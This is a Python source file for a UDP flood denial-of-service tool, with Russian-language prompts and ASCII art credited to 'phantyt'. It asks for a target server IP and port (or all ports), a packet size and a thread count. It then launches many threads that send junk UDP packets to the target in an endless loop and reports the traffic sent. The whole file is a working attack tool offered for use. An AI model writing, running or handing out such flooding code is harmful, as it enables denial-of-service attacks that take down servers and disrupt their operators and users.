from socket import socket, AF_INET, SOCK_DGRAM

from threading import Thread
from random import choices, randint
from time import time, sleep

from pystyle import *
from getpass import getpass as hinput



class Brutalize:

    def __init__(self, ip, port, force, threads):
        self.ip = ip
        self.port = port
        self.force = force # default: 1250
        self.threads = threads # default: 100

        self.client = socket(family=AF_INET, type=SOCK_DGRAM)
        # self.data = self._randbytes()
        self.data = str.encode("x" * self.force)
        self.len = len(self.data)

    def flood(self):
        self.on = True
        self.sent = 0
        for _ in range(self.threads):
            Thread(target=self.send).start()
        Thread(target=self.info).start()
    
    def info(self):

        interval = 0.05
        now = time()

        size = 0
        self.total = 0

        bytediff = 8
        mb = 1000000
        gb = 1000000000
        

        while self.on:
            sleep(interval)
            if not self.on:
                break

            if size != 0:
                self.total += self.sent * bytediff / gb * interval
                print(stage(f"{fluo}{round(size)} {white}Мб/c {purple}-{white} Всего: {fluo}{round(self.total, 1)} {white}Гб. {' '*20}"), end='\r')

            now2 = time()
        
            if now + 1 >= now2:
                continue
            
            size = round(self.sent * bytediff / mb)
            self.sent = 0

            now += 1

    def stop(self):
        self.on = False

    def send(self):
        while self.on:
            try:
                self.client.sendto(self.data, self._randaddr())
                self.sent += self.len
            except:
                pass
    def _randaddr(self):
        return (self.ip, self._randport())

    def _randport(self):
        return self.port or randint(1, 65535)




ascii = r'''


██████╗░██╗░░██╗░█████╗░███╗░░██╗████████╗██╗░░░██╗████████╗
██╔══██╗██║░░██║██╔══██╗████╗░██║╚══██╔══╝╚██╗░██╔╝╚══██╔══╝
██████╔╝███████║███████║██╔██╗██║░░░██║░░░░╚████╔╝░░░░██║░░░
██╔═══╝░██╔══██║██╔══██║██║╚████║░░░██║░░░░░╚██╔╝░░░░░██║░░░
██║░░░░░██║░░██║██║░░██║██║░╚███║░░░██║░░░░░░██║░░░░░░██║░░░
╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝░░░╚═╝░░░░░░╚═╝░░░░░░╚═╝░░░          '''



banner = r"""
       █████████████████████
    ████▀                 ▀████
  ███▀                       ▀███
 ██▀                           ▀██
█▀                               ▀█
█                                 █
█   █████                 █████   █
█  ██▓▓▓███             ███▓▓▓██  █
█  ██▓▓▓▓▓██           ██▓▓▓▓▓██  █
█  ██▓▓▓▓▓▓██         ██▓▓▓▓▓▓██  █
█▄  ████▓▓▓▓██       ██▓▓▓▓████  ▄█
▀█▄   ▀███▓▓▓██     ██▓▓▓███▀   ▄█▀
  █▄    ▀█████▀     ▀█████▀    ▄█
  ██           ▄█ █▄           ██
  ██           ██ ██           ██
  ██                           ██
  ▀██  ██▀██  █  █  █  ██▀██  ██▀
   ▀████▀ ██  █  █  █  ██ ▀████▀
          ██  █  █  █  ██  
          ██  █  █  █  ██
          ██  █  █  █  ██
           █▄▄█▄▄█▄▄█▄▄█""".replace('▓', '▀')


banner = Add.Add(ascii, banner, center=True)

fluo = Col.light_red
fluo2 = Col.light_blue
white = Col.white

blue = Col.StaticMIX((Col.blue, Col.black))
bpurple = Col.StaticMIX((Col.purple, Col.black, blue))
purple = Col.StaticMIX((Col.purple, blue, Col.white))


def init():
    System.Size(140, 40)                                                                                                                                                                                                                                                                   ,System.Title("Сделано phantyt".replace('.',''))
    Cursor.HideCursor()


init()


def stage(text, symbol = '...'):
    col1 = purple
    col2 = white
    return f" {Col.Symbol(symbol, col2, col1, '{', '}')} {col2}{text}"

def error(text, start='\n'):
    hinput(f"{start} {Col.Symbol('!', fluo, white)} {fluo}{text}")
    exit()


def main():
    print()
    print(Colorate.Diagonal(Col.DynamicMIX((Col.white, bpurple)), Center.XCenter(banner)))


    ip = input(stage(f"Айпи сервера {purple}->{fluo2} ", '?'))
    print()

    try:
        if ip.count('.') != 3:
            int('error')
        int(ip.replace('.',''))
    except:
        error("Ошибочка напиши админу - phantyt.")



    port = input(stage(f"Введите порт {purple}[{white}нажми {fluo2}enter{white} для атаки по всем портам{purple}] {purple}->{fluo2} ", '?'))
    print()

    if port == '':
        port = None 
    else:
        try:
            port = int(port)
            if port not in range(1, 65535 + 1):
                int('error')
        except ValueError:
            error("Ошибочка напиши админу - phantyt..")

    force = input(stage(f"Сколько пакетов {purple}[{white}нажми {fluo2}enter{white} чтобы отправить 1250 пакетов{purple}] {purple}->{fluo2} ", '?'))
    print()

    if force == '':
        force = 1250
    else:
        try:
            force = int(force)
        except ValueError:
            error("Ошибочка напиши админу - phantyt..")


    threads = input(stage(f"Скорость {purple}[{white}нажми {fluo2}enter{white} чтобы скорость была 100{purple}] {purple}->{fluo2} ", '?'))
    print()

    if threads == '':
        threads = 100
    else:
        try:
            threads = int(threads)
        except ValueError:
            error("Ошибочка напиши админу - phantyt..")


    print()
    cport = '' if port is None else f'{purple}:{fluo2}{port}'
    print(stage(f"Начинаю атаку {fluo2}{ip}{cport}{white}."), end='\r')


    brute = Brutalize(ip, port, force, threads)
    try:
        brute.flood()
    except:
        brute.stop()
        error("Ошибочка напиши админу - phantyt..", '')
    try:
        while True:
            sleep(1000000)
    except KeyboardInterrupt:
        brute.stop()
        print(stage(f"Атака остановленна. {fluo2}{ip}{cport}{white} было отправлено {fluo}{round(brute.total, 1)} {white}Гб.", '.'))
    print('\n')
    sleep(1)

    hinput(stage(f"Нажми {fluo2}enter{white} для {fluo}выхода{white}.", '.'))

if __name__ == '__main__':
    main()    